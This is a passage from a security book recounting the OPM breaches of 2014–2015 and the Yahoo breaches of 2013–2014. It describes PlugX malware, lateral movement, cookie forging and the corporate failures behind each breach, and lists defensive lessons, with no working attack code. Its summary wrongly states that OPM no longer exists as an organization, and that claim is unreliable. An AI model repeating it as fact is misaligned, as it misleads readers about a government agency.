could not conduct higher-order functions in OPM’s IT environment using  just the stolen credentials.  6 A VPN, or virtual private network, anonymized a user’s IP address and location,  as well as encrypting a user’s Internet traffic. A VPN makes browsing the Web  more private and secure.  140   Chapter 6    the OpM BreaChes Of 2014 and 2015  Despite the lack of administrator credentials, X2 was able to open a  remote desktop protocol  RDP 7 session and download PlugX malware  onto an OPM SQL server that was “one hop away from a machine with  direct access to the background investigations and fingerprint database.”8  To understand how X2 was able to tunnel into the heart of OPM’s   network, let’s take a closer look at PlugX malware and how hackers used  it. PlugX malware comes with 13 default modular plug-ins. These plug-ins  give hackers plenty of different functionality options including, but not  limited to:    1.  The ability to log a user’s every keystroke    2.  The ability to modify and copy files    3.  The ability to capture screenshots and videos of user   activity    4.  The ability to perform administrator tasks such  as terminating processes, logging off users, and  rebooting victim machines  In essence, the PlugX malware used by X2 gave the hacker almost   complete control over the victimized system. After installing PlugX  malware onto an OPM SQL server, X2 had access to various OPM  applications that were running on the server, including a jump box,  or jump server,9 that OPM administrators would use to directly access   7 RDP, or remote desktop protocol, is a popular protocol that allows users to access  their Windows’ machines remotely. 8 Source: Page 85 of the House Majority Staff Report: https:  republicans-  oversight.house.gov report opm-data-breach-government-jeopardized-  national-security-generation  9 A jump server acts as a “choke point” between less critical and more critical  systems. A user that wants access to the more critical system must authenticate  at the jump server. The jump server is a single point of entry that all access to  the more critical system must go through and can be monitored for potentially  unauthorized access attempts.  141   Chapter 6    the OpM BreaChes Of 2014 and 2015  background investigation data. X2 was able to laterally move to the jump  server and then gain direct access to the PIPS mainframe, all of the FTS  machines  Fingerprint Transmission System that stores federal employee  fingerprints , and eventually access the personnel records hosted by  the Department of Interior  DOI  servers. Pivoting to the jump server  allowed X2 to bypass all the firewalls that were regulating traffic between  the normal network channels and PIPS mainframe, as well as the FTS  machines and DOI’s system.  X2 acquired access to OPM’s mainframe in June 2014. Between   July and August 2014, X2 exfiltrated 21.5 million security background  investigations from the PIPS mainframe. A few months later, X2 stole 4.2  million personnel records from the Department of Interior. In March  2015, X2 exfiltrated 5.6 million fingerprints. This highly sensitive data is  referred to by many as the crown jewels of OPM, and the exfiltration of  this data from OPM will have immense consequences for a generation  of US intelligence operatives. Even worse, OPM did not discover X2 in its  network until April 2015, ten months after X2 had initially compromised  OPM and one month after the Big Bang initiative which kicked X1 out of  the network.   OPM Finds Captain America and Iron Man After the X1 breach in 2014, OPM took some steps to increase its security  defenses. As part of its security upgrade, OPM bought and began to deploy  ten security tools to its legacy IT system. One of the tools OPM prioritized  implementing was Websense, a web proxy product that allowed OPM to  monitor and block web access. OPM had an older version of Websense  that was able to filter user traffic. OPM struggled to deploy the newer,   142   Chapter 6    the OpM BreaChes Of 2014 and 2015  more advanced version of Websense because OPM was running so many  outdated legacy systems. The agency did not roll out the new version  of until April 2015. When the upgraded version of Websense began to  run on OPM systems, a contractor noticed an unknown SSL10 certificate   opmsecurity.org  that was communicating with OPM servers. When  OPM engineers took a closer look at the domain opmsecurity.org,   engineers found that the domain was registered to a random email  address and the registrant’s name was Steve Rogers, also known as Captain  America. OPM knew it was under attack, again.  Concerned as to what Captain America was doing on its network,    OPM investigated the spoofed11 domain and discovered opmsecurity.org   was communicating with three OPM workstations and three OPM  servers. Furthermore, OPM discovered three additional workstations  that were communicating with two additional malicious domains. The  first additional malicious domain, opm-learning.org, was registered to  Tony Stark, also known as Iron Man, and the second additional domain,  wdc-new-post.com, was generic. Forensic scans concluded that Iron Man,  hosting opm-learning.org, was communicating with malware that was  disguising itself as a McAfee anti-virus executable. The McAfee-named  executable tipped OPM off that the executable was actually malware  because the OPM was never a customer of the security firm McAfee.  With all this information about its compromised systems, OPM turned to  Cylance, a security company known for leveraging artificial intelligence in  malware detection for assistance with incident response.  10 An SSL, or secure socket layer, certificate is used to help create a secure   connection between a browser and a website.  11 A spoofed domain is a malicious domain set up to look like a legitimate website   in hopes of tricking a user into interacting with the spoofed domain that looks  legitimate.  143   Chapter 6    the OpM BreaChes Of 2014 and 2015   Cylance Attempts to Help OPM Before diving into Cylance’s role in OPM’s incident response plan, we will  first take a look at how Cylance and OPM interacted before the 2015 breach  and what security products Cylance offers.  After the 2014 breach by X1, the IT security team at OPM highly   recommended that OPM purchase a security tool offered by Cylance that  used artificial intelligence instead of traditional signature-based analysis  for malware detection12 and had functionality to automatically block and  quarantine malware. OPM opted to purchase a more limited security  product offered by Cylance which only had detection capability but no  blocking capability. By comparison, 90% of Cylance’s customers opt for  the auto-quarantine version of the product which supported blocking  capability as it was preventive.  Cylance security experts analyzed findings that indicated four distinct  malicious programs, or binaries, running on OPM’s network. Three of the  malicious binaries had a Cylance rating of –1  the worst possible score,  meaning extremely malicious , and the fourth binary had a score of –0.93   still very malicious . Any binary given a score of –0.8 or lower was deemed  definitely malicious. The four malicious binary files were stored within a  folder named McAfee.SVC and are described in Figure 6-2.  12 In a signature-based approach to detecting malware, a scanner looks for   sequences of bytes that are known to appear in malware files. However, it can be  relatively easy for malware authors to change the bytes in their files so that they  don’t match any known sequences.  However, an approach that uses artificial  intelligence may be able to detect malware even though there may not be any  previously known sequences of bytes that appear in malware files.  144   Chapter 6    the OpM BreaChes Of 2014 and 2015  Figure 6-2.  A table detailing the four malicious binaries on OPM’s  network that ran PlugX malware  Information Source: The House  Majority Staff Report, Page 99   Two days after OPM detected X2, Cylance granted OPM full access   to the version of its product that supported blocking capability on a  “demonstration basis.” Cylance was unsure if OPM would actually  purchase its products, but given the circumstances, Cylance CEO Stuart  McClure testified that “they [OPM] were under severe attack and had been  for quite some time.”13 Within 24 hours of deploying Cylance in alert mode,  it had identified 39 Trojans  malware , all with the worst possible Cylance  rating of –1. Because OPM chose to run Cylance in alert mode, personnel  had to manually analyze every malicious instance flagged by the product  and choose how to proceed. A Cylance security director testified “To put  it bluntly, [Cylance] lit up like a Christmas Tree.”14 It was found that one in  five of all of OPM’s endpoints was infected. It is unclear as to whether or   13 Source: Page 101 of the House Majority Staff Report: https:  republicans-   oversight.house.gov report opm-data-breach-government-jeopardized-  national-security-generation   14 Source: Page 103 of the House Majority Staff Report: https:  republicans-   oversight.house.gov report opm-data-breach-government-jeopardized-  national-security-generation   145   Chapter 6    the OpM BreaChes Of 2014 and 2015  not OPM was using any anti-virus at all prior to its Cylance deployment. If  OPM was, the previous anti-virus package was clearly ineffective.  In Figure 6-3, Chris Coulter, a managing director at Cylance, informs   the CEO that he came across an encrypted RAR archive. A RAR archive is a  compressed encrypted archive of other files. In many cyberattacks, hackers  will move all stolen files to a single RAR archive to make exfiltrating the  data a simpler process. Because RAR archives can be encrypted, the  archive may require a password to decrypt the data. Usually, hackers will  store the encryption password in a BAT  batch  file or VBS  visual basic  scripting  file to automate certain commands. Coulter could not find  such a file in this instance, so Cylance was forced to use a GPU password  cracker, which takes a lot of time and computing power.  Figure 6-3.  An email from Cylance Security Director Chris Coulter   Source: House Majority Staff Report, Page 103   Cylance also found command shells on OPM’s network that would  allow hackers to have complete control over a victim’s machine as well  as dormant Hikit malware from the 2014 X1 breach. Nine days after  discovering X2’s presence, OPM made the decision to put Cylance in auto-  quarantine mode as Cylance and OPM personnel could not keep up with  alert mode, which flagged over 1100 instances perceived to be threats.  146   Chapter 6    the OpM BreaChes Of 2014 and 2015  In the following three months, OPM slowly but steadily made   discoveries about the details of the breach. DOI confirmed that the  attackers gained access to the DOI’s personnel records through a trusted  connection between the compromised OPM network and the DOI.  In the midst of the three months of investigation, OPM purchased   Cylance just hours before the demonstration period ended. After 74 days  of running on over 10,000 OPM machines, Cylance quarantined over 2,000  malicious files. McClure, who worked closely with OPM during the fallout of  the breach, stated to Congress that if OPM acted more quickly in purchasing  and deploying Cylance as the OPM security team had recommended a year  earlier, the attack could have been prevented. There are many anti-malware  products on the market that could have helped OPM, of which Cylance was  one, and implementing strong anti-malware countermeasures  earlier could  have potentially avoided the breach.   Lessons Learned Of the many lessons to be learned from the OPM breach, one of the  primary ones is the importance of prioritizing and investing in security  and the importance of leadership’s role in creating a culture of security   see Chapters 10 and 11 . Many of the deficiencies in the OPM breach  were known, and there was a failure to act extremely aggressively to fix  the deficiencies on the part of OPM leadership. A single failed audit or a  revocation of authority to operate even one critical system should send  a shiver down a leader’s spine followed by an immediate compulsion to  be extremely vocal and act in a manner to aggressively fix deficiencies. In  the case of OPM, there were multiple failed audits, multiple revocations of  authorities to operate, and a general downplaying of issues rather than a  raise of alarms.  147   Chapter 6    the OpM BreaChes Of 2014 and 2015  The adversaries were underestimated, OPM security staff was not   taken seriously, and a level of investment in security commensurate with  the charter of the organization was not made. Access to all the technology  and processes in the world cannot help if leaders do not create the right  culture to quickly adopt and deploy them. At the same time, although  having the right leadership, culture, and investment is a remarkable asset  for an organization, those assets need to use resources and dollars to  execute on deploying the right tools and processes; hence, we put focus on  the right tools and processes as well. With the importance of leadership,  culture, and investment in mind as probably the top lesson to be learned  from the OPM breaches, the following are a list of some technology- and  process-related lessons to be learned:    1.  A strong incident management process: While   tools and technologies can help, they cannot replace  a mature process for incident management and  remediation. Having a documented process that is  agreed by all concerned stakeholders will be readily  applicable during an active incident.    2.  Multi-factor authentication  MFA : Having MFA  will ensure simple password cracking techniques  or keylogging software are not sufficient for hackers  to gain access to confidential data. MFA should be  applied to all systems that require privileged access.    3.  Network segmentation: Having traditional   network-based segmentation or software-defined  segmentation is very valuable to contain adversary  access and prevent lateral movements of attackers.  More advanced security architectures such as a  zero trust architecture can greatly limit an attacker's  movement and capabilities in a compromised  network.  148   Chapter 6    the OpM BreaChes Of 2014 and 2015    4.  Network-based anomaly detection: Having strong   intrusion detection and prevention technologies  across the broad network footprint can detect  unusual movements, anomalies, and suspicious  traffic patterns. For instance, outbound calls to  command and control centers over encrypted  channels can be detected, especially when applied  to specific geolocations.    5.  Blocking and prevention technologies: While  detection technologies mentioned will certainly  help detect attacks, the security industry has seen  time and again that mega-breaches are missed due  to alert fatigue. In particular, many alerts are false  positives and cause analysts to become less sensitive  to them, hence creating alert fatigue. Having strong  prevention systems that will automatically block  threats that are true positives is important. These  systems should be tuned to reduce false positives  to ensure legitimate traffic is not blocked and  contribute to additional alert fatigue.    6.  Insufficient monitoring: Detailed audit logs should   be maintained at all times to trace any and all  transactions or activities. Having detailed logs will  help investigate a potential breach or even detect a  breach in progress.    7.  Advanced endpoint and anti-malware protection:  When all else  edge, network, blocking technologies,  etc.  fail, the last line of defense is the endpoints  themselves. These include both user endpoints and  servers. Traditional anti-virus software is useful for   149   Chapter 6    the OpM BreaChes Of 2014 and 2015  compliance but is often signature based and misses  emerging threats. Many of the newer endpoint  technologies rely on artificial intelligence and  machine learning and are integrated with real-time  threat intelligence to provide enhanced security.    8.  Third-party supply chain risk management:   Security of an organization’s supply chain is an area  that many high-profile breaches have highlighted  as an initial vector of compromise. Security is only  as strong as the weakest link, and in many data  breaches, the weakest link has proven to be third- party contractors. Strong recommendations should  be provided for third-party vendors that outsource  key business activities. Continuous monitoring and  validation of third-party security posture are vital in  ensuring a company’s own security.    9.  Training and education: Investing in the latest   training and education for users and, more  importantly, administrators should be a priority.  Such training should include the best practices for  responding to attacks and breaches. Administrator  and team training is typically manifested through  attack simulations that involve a defensive team   blue team , an offensive or hacker team  red team ,  or a combination  purple team  in which red team  attackers and blue team defenders interactively find  and patch security vulnerabilities.    10.  Security audits: While point-in-time snapshots   of security controls can be helpful in passing  compliance requirements, both scheduled and   150   Chapter 6    the OpM BreaChes Of 2014 and 2015  random audits including vulnerability assessments  and penetration testing can help ensure that point- in-time compliance processes do not miss critical  gaps in security.   Summary The Office of Personnel Management was breached at least three times,  at least twice in 2014 and at least once in 2015. The 2014 and 2015  breaches resulted in Chinese government–sponsored hackers exfiltrating  21.5 million security background investigations, 4.2 million personnel  records, and 5.6 million fingerprint records. An investigation of both  the breaches as well as OPM’s response to each breach was conducted  by Congress, which had many questions about how such sensitive and  private information about the US intelligence community was stolen by  a foreign adversary. Congress found that OPM was negligent and did not  prioritize security, lacked communication and transparency, and was slow  to respond to advice and recommendations provided by federal agencies,  OPM contractors, and OPM’s very own security team. The following are  the top two reasons OPM was unable to protect itself and was breached at  least twice in two years:    1.  Lack of prioritization and investment and poor   leadership: Before the 2014 and 2015 breaches,  the Inspector General  IG  warned OPM for over  10 years that the agency lacked adequate security  measures to protect its highly sensitive data. OPM  did not prioritize security highly enough despite  many failed audits. Between 2013 and 2015, OPM  was spending $7 million a year on cybersecurity,  whereas other agencies were spending tens or  hundreds of millions on security. Only one other   151   Chapter 6    the OpM BreaChes Of 2014 and 2015  federal agency, the Small Business Administration,  was spending less than OPM. Despite the lack of  funding, OPM leadership, primarily Acting Director  Katherine Archuleta and CIO Donna Seymour,  were at the helm during the breaches at OPM. OPM  did not make sufficient security upgrades and had  underfunded its security team.  In the time between the 2014 and 2015 breaches,  OPM’s own security team requested more security  resources, and US-CERT as well as the IG provided  additional recommendations to strengthen security.  OPM chose to not respond to a large majority of  these recommendations. Even after both breaches  had occurred, OPM was slow to purchase integral  security tools.    2.  Malware: It is unclear whether OPM had anti-  virus software running on every endpoint before  purchasing security products from Cylance. In the  breaches, malware was the primary tool hackers  used to infiltrate OPM’s network and exfiltrate  data. If OPM did have anti-virus software, it was  ineffective and did not sufficiently inform OPM  of any significant malicious activity. If OPM did  not have anti-virus prior to purchasing Cylance  products, it was likely negligent in its security  posture as anti- virus is a basic, necessary  but not  sufficient  defense.  In many of our other chapters, breaches are sometimes focused on   one or more technical root causes that are more specific than lack of  prioritization, lack of investment, poor leadership, or outright negligence.  In the case of OPM, the most significant reason for the breaches was due   152   Chapter 6    the OpM BreaChes Of 2014 and 2015  to these meta-level causes, though, and the agency failed to protect the  personal data of US intelligence officials. Both OPM’s director and CIO  resigned during Congress’ investigations of the breach. As a result of the  blow to the US national security, all background investigation data and  IT security responsible for such data has been made the responsibility of  the Department of Defense under the newly created National Background  Investigations Bureau. For many organizations, cybersecurity risks are an  existential threat, and they should be prioritized as such. Unfortunately, in  the case of OPM, that realization was made too late, and too little was done  about it. As such, OPM no longer exists as an organization, and its critical  responsibilities have been given to another organization that will hopefully  do a better job. Such can happen both in the public sector, as in the case of  OPM, and in the private sector as well.  153   CHAPTER 7  The Yahoo Breaches  of 2013 and 2014  In 2016, Yahoo disclosed to the public that it had been breached in 2014.  Yahoo’s 2014 breach exposed the names, email addresses, telephone  numbers, birthdates, “hashed” passwords, and, in some cases, security  questions of over 500 million users. While investigating the breach of 2014,  Yahoo discovered that the company had been separately breached in 2013.  Yahoo initially reported that the 2013 breach affected over one billion users  while it was in the process of getting acquired by Verizon. In October 2017,  after its acquisition by Verizon was complete, Yahoo reported that the 2013  breach affected all three billion users. Figure 7-1 shows a timeline of these  breaches and the major events that occurred after the breaches. Yahoo  was questioned and criticized for disclosing the breaches two to three  years after they occurred. During a Senate hearing that took place in the  aftermath of the breaches, frustrated Senator Thune of South Dakota asked  former Yahoo CEO Marissa Mayer, “Why the delay in disclosing it? I mean  it took from 2013, three years.”    Neil Daswani and Moudy Elbayadi 2021  N. Daswani and M. Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_7  155   Chapter 7    the Yahoo BreaChes of 2013 and 2014  Figure 7-1.  A timeline of the major events during and after both of  the Yahoo breaches  Yahoo Inc., founded in 1994, was one of the early pioneers of the  Internet. In part known for its usage of pay-per-click advertising sold  via online auctions  acquired from Overture , its stock reached its peak  alongside the dot-com bubble, reaching a market capitalization of $117  billion in 2000.  In September 2016, Yahoo reported a breach that started in early 2014   with a Yahoo employee opening a spear phishing email. That employee  became a victim of social engineering; as an eventual result, 500 million  accounts were exposed to attack, and Yahoo faced financial consequences  that were in the hundreds of millions of dollars, not to mention reputation  damage to Yahoo’s brand.  In December 2016, just months after reporting the 2014 hack that  compromised the accounts of over 500 million users, Yahoo disclosed  another breach from 2013 to the public. The 2013 breach was initially  reported to have compromised over one billion accounts. Bob Lord,   156   Chapter 7    the Yahoo BreaChes of 2013 and 2014  Yahoo’s CISO at the time, released a statement1 in which the company  believed that the 2013 and 2014 breaches were distinct, but like the smaller  2014 breach, the newly reported 2013 breach may have exposed similar  data fields, including usernames, email addresses, telephone numbers,  dates of birth, hashed passwords, and encrypted or unencrypted security  questions and answers.  One year later, in October 2017, Verizon, which had acquired Yahoo,   announced that after further investigation by their security team, law  enforcement, and forensic experts, the company discovered all three billion  Yahoo accounts were compromised by the breach in 2013. The magnitude of  the breach was due to the attacker developing the capability to “mint” Yahoo’s  website cookies based on source code and other information that was stolen  from Yahoo. We describe how theft of Yahoo’s cookie minting scheme led to a  breach of all three billion Yahoo users in more detail later in this chapter.  Former Yahoo CEO Marissa Mayer stated at a Senate hearing in late   2017, “To this day we have not been able to identify the intrusion that led  to this theft. We don’t exactly understand how the act was perpetrated.  That certainly led to some of the areas where we had gaps of information.”2  Hackers had in fact downloaded “log cleaner” malware into Yahoo’s  network to remove traces of their activities, and that likely led to Yahoo’s  challenges in investigating how the data breach occurred.   Russian Attackers In March 2017, the US Department of Justice  DOJ  released its indictment  of the 2014 hackers. The DOJ indicted two officials of the Russian Federal  Security Service  FSB , the successor to the USSR’s KGB, along with two   1 Source: https:  yahoo.tumblr.com post 154479236569 important-security-  information-for-yahoo-users 2 Source: www.commerce.senate.gov 2017 11 executive-session  157   Chapter 7    the Yahoo BreaChes of 2013 and 2014  freelance hackers. The Russian agents and freelance hackers used stolen  Yahoo data to serve Russian state interests and personally profit from the  stolen data.  The FSB officers, Dmitry Dokuchaev and Igor Sushchin, ordered  the hackers to access the accounts of Russian officials, officials from  neighboring countries such as the Ukraine, Russian journalists, and  foreign diplomats. Although Dokuchaev and Sushchin were employees of  the Russian government, the Kremlin had the following to say about the  breach:  As we have said repeatedly, there is absolutely no question of  any official involvement by any Russian agency, including the  FSB, in any illegal actions in cyberspace.  —Dmitry Peskov, Spokesman for the Kremlin  One of the freelancer hackers, Alexsey Belan, also stole credit card   and gift card information from Yahoo user emails for personal profit.  Furthermore, Belan changed the top search result for erectile dysfunction  medication on Yahoo’s search engine to be an online pharmacy for which  he received a revenue share for user’s clicks to the online pharmacy.  The Yahoo breach was not Belan’s first successful attack. Prior to the  Yahoo breach, he was indicted in 2012 and 2013 for hacking multiple US  ecommerce companies. In 2014, Belan was arrested in Europe, but before  he could be extradited to the United States, Belan managed to escape back  to Russia.  The second freelance hacker, Karim Baratov, was a 21-year-old   independent hacker living in Canada. The FBI determined that Baratov’s  job was to access non-Yahoo accounts  e.g., Gmail , by leveraging the  fact that such accounts might use a compromised Yahoo account as the   158   Chapter 7    the Yahoo BreaChes of 2013 and 2014  “recovery email address.” In many online email services, a password reset  request can be sent to the recovery email address when the user loses or  forgets their password. Given that attackers had already compromised  Yahoo email addresses, they used them to reset passwords of other  services to passwords of their choice and take control of non-Yahoo  accounts as well. The FSB agents paid Baratov a bounty for every target  account Baratov could successfully hack.  Charging a $100 bounty per account, Baratov made $211,000 hacking  user accounts. Baratov did not know he was working for FSB agents and  was arrested at his home in Ancaster, Ontario, in March 2017. In May 2018,  after being extradited to the United States, Baratov was sentenced to five  years in prison.   Attack Deep Dive Yahoo’s 2014 attack was first publicly reported in August 2016, when 200  million Yahoo accounts were put up for sale on the dark web on a site  called “The Real Deal Market” for a price of three Bitcoin  approximately  $1800 at the time . By September 2016, following an internal investigation,  Yahoo announced that 500 million records were illegally accessed. Yahoo’s  estimates of the number of records stolen then increased over time as  additional investigation took place.  Public documents surrounding Yahoo’s breach leave much to be   desired with regard to the technical details of the breach. In this section,  we do a “deep dive” on the attack to the best of our ability given the lack of  some of the technical details surrounding the breach. As a part of our deep  dive, we explain how password credentials are typically securely stored   159   Chapter 7    the Yahoo BreaChes of 2013 and 2014  and how website cookies are typically securely generated. However, our  guess based on documents that have been made public is that Yahoo’s  systems may have deviated significantly from typical secure design for  credential storage and cookie minting.   The User Database  UDB  In November of 2014, after making an initial compromise, Alexsey Belan  copied Yahoo’s user database  UDB , containing information from 500  million Yahoo accounts, to his computer. Yahoo’s security team discovered  a breach of the UDB within days of it happening in 2014, but senior  management at Yahoo felt that disclosure of the breach was not necessary.  From a 10-K report that Yahoo filed with the Securities and Exchange  Commission  SEC  in 2016, “it appears certain senior executives did not  properly comprehend or investigate, and therefore failed to act sufficiently  upon, the full extent of knowledge known internally by the Company’s  information security team.”3  In addition to personal information like email address and name,   the UDB stored “hashed” passwords.4 Hashed passwords are passwords  that have been “scrambled” in such a way that, given a password that a  user supplies at login time, it is easy to mathematically compute if it is a  match to the hashed password stored in the password database. However,  given only the hashed password  that could be obtained by an attacker if a  password database is stolen , it is difficult to determine what might be the  unscrambled password that was used to generate it. In password security   3 www.sec.gov Archives edgar data 1011006 000119312517065791  d293630d10k.htm 4 Passwords in Yahoo’s systems were hashed using the bcrypt algorithm described  in “A Future-Adaptable Password Scheme” by Niels Provos and David Mazieres,  published in the 1999 USENIX Annual Technical Conference and MD5, the  Message Digest algorithm described in IETF RFC 1321.  160   Chapter 7    the Yahoo BreaChes of 2013 and 2014  systems, hashed passwords are typically stored instead of passwords  themselves, such that if the system is broken into, an attacker would not be  able to walk away with all users’ unscrambled passwords “in the clear.”  In addition, to prevent an attack called an “offline dictionary attack”, in  which attackers try to match every word in the dictionary  or combinations  of them , against stored hashed passwords, password security systems  typically store a distinct “salt” for each user, a number which is used  as part of the computation of the hashed password. The salt makes it  harder to conduct a “brute-force” dictionary attack in which all users are  targeted because in addition to trying all possible dictionary words and  combinations of them, every possible number that can be used for a salt  also needs to be tried. As such, even having stolen hashed passwords and  or potentially salts from the UDB, the hackers should not have been able to  log in to all three billion accounts if Yahoo’s password security and cookie  minting algorithms were designed correctly.5  A compromise of the UDB, if it only stored hashed passwords and  potentially salts, would not have necessarily led to a breach of all user  accounts. That said, there was other sensitive information in the UDB  that may have warranted disclosure of the breach. Also, other companies   e.g., LinkedIn  have had password breaches in which hashed passwords  were stolen, but they still reported the breach. The SEC stated in a 2018  press release, “Yahoo failed to properly investigate the circumstances of  the breach and to adequately consider whether the breach needed to be  disclosed to investors.”6  However, Yahoo’s UDB was not only stolen, but the attackers stole  source code that Yahoo used to mint its website cookies. The attackers  used a cookie manager application shown in Figure 7-2 to mint Yahoo   5 More information about how password security systems should be architected  can be found in Chapter 9 of Foundations of Security by Neil Daswani, Christoph  Kern, and Anita Kesavan  Apress, 2007 . 6 www.sec.gov news press-release 2018-71  161   Chapter 7    the Yahoo BreaChes of 2013 and 2014  cookies. Stealing the UDB combined with knowledge of how Yahoo minted  its website cookies allowed the hackers to access and log in to all Yahoo  accounts without a password.  Figure 7-2.  A screenshot of a cookie application manager the  Russian FSB agents and freelance hackers were using  Source: The  Department of Justice    Yahoo Cookie Compromise Nearly every website that you visit sends you a cookie once you have  logged in. A cookie is a small piece of information sent to the browser  by a web server. The browser is expected to send the cookies back to the  website every time it accesses a page on the website.7  7 Many websites will also send your browser a cookie before you log in, but the  specific type of cookie that we are referring to here is an authentication cookie as  opposed to a tracking cookie.  162   Chapter 7    the Yahoo BreaChes of 2013 and 2014  The way that most websites authenticate users is that after the   username, password, and or any other relevant credentials are  successfully authenticated, the website issues an authentication cookie  to the user’s web browser. Upon navigating to a web page, the browser  sends the authentication cookie back to the website, and the website  checks the validity of the cookie instead of asking the user to provide their  username and password to access each sensitive page on the website. As  such, cookies should be minted in a way that is unique to a particular login  session and in a way that they cannot be arbitrarily forged. If a cookie can  be forged, an attacker can log in as if they are the legitimate user without  that user’s authorization or password.  As part of a secure cookie minting scheme, when the user logs in,   the server generates a “nonce,” a random number that is only used once  per user session, as one of the inputs used to mathematically derive the  cookie.8 The server can store the nonce, in addition to using it to mint a  cookie to send to the browser. After a set expiration time period, the server  can delete the nonce from its database or ignore it, making the generated  cookie totally worthless.  It is unclear from documentation available publicly as to whether or  not Yahoo’s UDB stored a salt and whether or not there was an expiration  period. A salt is typically used multiple times across multiple login  sessions, but a nonce should only be used once. Ideally, a nonce should  be completely unpredictable and generated freshly on every login. If a  salt was reused as a nonce and was predictable on a per-user basis, the  attackers would have been able to use stolen salts from the UDB to log in to  Yahoo user accounts at will.  Alternatively, Yahoo’s UDB may not have stored a salt at all, and only   stored a nonce. If that was the case, then Yahoo senior management  should have certainly disclosed the 2014 UDB breach immediately, as   8 The name nonce comes from the fact that it is a number that should be used only  once.  163   Chapter 7    the Yahoo BreaChes of 2013 and 2014  stealing the nonces from the database would have given attackers the  ability to immediately log in at will as any user in the database. As such, we  are giving Yahoo senior management the benefit of the doubt in positing  that in stealing the UDB with perhaps only salts, they may have believed  that the risk to users was not significant as they were not aware that the  source code to mint cookies was also stolen.  Alas, the Russian attackers also stole Yahoo’s source code for cookie  minting, as well as the information in the UDB, and as such were able to  forge cookies, thereby giving them the ability to log in as any Yahoo user  without needing a password.  We note that in addition to stealing the source code for minting, the  attackers may also need to have stolen a secret key only known to Yahoo  which was used in minting cookies such that they cannot be forged. If  only theft of the source code was required and such a secret key was  embedded in the source code, then in addition to phishing and malware  as root causes of the breach, a software design vulnerability of the cookie  system would be yet another cause. A more secure designed system would  require a separately stored secret key  in addition to a per-user nonce  to  mint cookies. If cookie minting did not require a secret key only known to  Yahoo, and theft of the source code alone was sufficient to mint cookies,  then the cookie minting algorithm had a vulnerability in which its security  was only protected by obscurity  that no one else knew the algorithm ,9  a rookie mistake in the field of computer security. If the cookie minting  algorithm did require a secret key, then there must have existed a software  vulnerability  configuration or code  that allowed the attackers to steal the  secret key in addition to the source code.  One consolation about how Yahoo implemented its cookie system   was when users changed their passwords, the nonce associated with  their individual accounts was also changed, and any outstanding cookies   9 See Chapter 2, Section 6 of Foundations of Security, on “Security by Obscurity” by  Neil Daswani, Christoph Kern, and Anita Kesavan  Apress, 2007 .  164   Chapter 7    the Yahoo BreaChes of 2013 and 2014  would be invalid. As such, Yahoo users that changed their passwords after  November 2014, when the UDB was stolen, would be safe from having  their accounts accessed and emails read by the hackers.   Account Management Tool Compromise Given only the information in the UDB, hackers could not simply search  through all Yahoo accounts to find people of interest. Instead, the hackers  used Yahoo’s Account Management Tool  AMT , which was used by Yahoo  to edit accounts. With no knowledge of which people had Yahoo accounts  or what their email addresses were, the hackers searched for accounts by  recovery email address using the AMT. For example, if a person worked for  Kommersant, an opposition newspaper targeted by the hack,   the target’s recovery email address would likely be name@kommersant.com.   By searching for all accounts with a recovery email address ending in   @kommersant.com, the hackers were able to target all employees of the  paper. The attackers targeted user accounts of many organizations by  searching based on the domain of the recovery email address.   32 Million Cookies Minted After accessing the UDB and gaining the ability to forge cookies, the hackers  accessed Yahoo accounts deemed important for Russian state interests.  The Department of Justice’s indictment states that the hackers targeted:  “Russian journalists; Russian and U.S. government officials; employees of  a prominent Russian cybersecurity company; and numerous employees  of U.S., Russian, and other foreign webmail and internet-related service  providers whose networks the conspirators sought to further exploit.”  In addition to accounts of interest to the FSB, the hackers also targeted   companies in the private sector. Private sector targets included a Russian  investment banking firm, a French transportation company, a US financial  services and private equity firm, a Swiss Bitcoin wallet and banking firm,  and a US airline.  165   Chapter 7    the Yahoo BreaChes of 2013 and 2014  The hackers also attacked US officials, including those in the White   House and US military. Yahoo reported in a Form 10-K to the SEC that over  32 million accounts were broken into via forged cookies:  In November and December 2016, we disclosed that our out- side forensic experts were investigating the creation of forged  cookies that could allow an intruder to access users’ accounts  without a password. Based on the investigation, we believe an  unauthorized third party accessed the Company’s proprietary  code to learn how to forge certain cookies. The outside forensic  experts have identified approximately 32 million user accounts  for  which  they  believe  forged  cookies  were  used  or  taken  in  2015 and 2016.  —Form 10-K, 2017, Yahoo Inc.   The Aftermath The largest breach ever recorded at the time, the Yahoo breach resulted in  unprecedented financial consequences. Not only did investigations lead to  fines and lawsuits, but the breach also reduced the valuation of Yahoo and  eroded trust with many of the company’s users and customers. In 2016,  Reuters reported, “many Yahoo users rushed on Friday to close accounts,  some of which they had not used in years, after the Internet company  announced it suffered one of the world’s largest cyber breaches.”  In 2016, when news of the breach broke, Verizon was in the final stages   of its purchase of Yahoo. In July of that year, the two sides had settled on  a purchase price of $4.83 billion. After news of the breach broke, Verizon  renegotiated the acquisition price. Verizon finalized its acquisition of  Yahoo in June 2017 for a total of $4.48 billion, $350 million less than the  initial price agreed upon. There were further implications of the breach,  even beyond the drop in acquisition price. In addition to the lower  valuation and fines, Yahoo faced customer attrition.  166   Chapter 7    the Yahoo BreaChes of 2013 and 2014  In April 2018, Yahoo settled with the SEC for $35 million. The SEC’s   investigation of the breach found that when Yahoo’s senior management  was informed of the hack in December 2014, Yahoo had an obligation to  inform shareholders of this discovery.  We do not second-guess good faith exercises of judgment about  cyber-incident disclosure. But we have also cautioned that a  company’s response to such an event could be so lacking that  an  enforcement  action  would  be  warranted.  This  is  clearly  such a case.  —Steven Peikin, Co-Director, SEC Enforcement Division  In July 2020, Yahoo settled a $117 million class action suit filed by   Yahoo users. Users sued Yahoo for failing to adequately protect their data.  Information uncovered after the breach suggests that Yahoo’s security  team was not given enough resources nor power to protect the company  against hackers. The New York Times reported that “The Paranoids,” the  internal name for Yahoo’s security team, often clashed with other parts of  the business over security costs. And their requests were often overridden  because of concerns that the inconvenience of added protection would  make people stop using the company’s products.  The final consequence of the breach, which cannot be measured in  dollars, and yet affects the entire world, is the immense loss of privacy  for anyone that communicated with anyone else that had a Yahoo email  address. When we use the Internet, we expect a degree of privacy and  security for our data. When we give a website our personal information,  we assume that information will be accessed as per the company’s privacy  policy and that security safeguards that implement privacy policies are  strong. Yahoo’s hacks in both 2013 and 2014 serve as a wake-up call for  Internet users, legislators, and other tech companies. Privacy and security  are too often overlooked and must be made a priority to protect user data  and national security.  167   Chapter 7    the Yahoo BreaChes of 2013 and 2014   Summary As a result of its breaches, Yahoo was at the center of attention of the   entire tech community, as well as law enforcement and investigators.   The multibillion-dollar company was responsible for 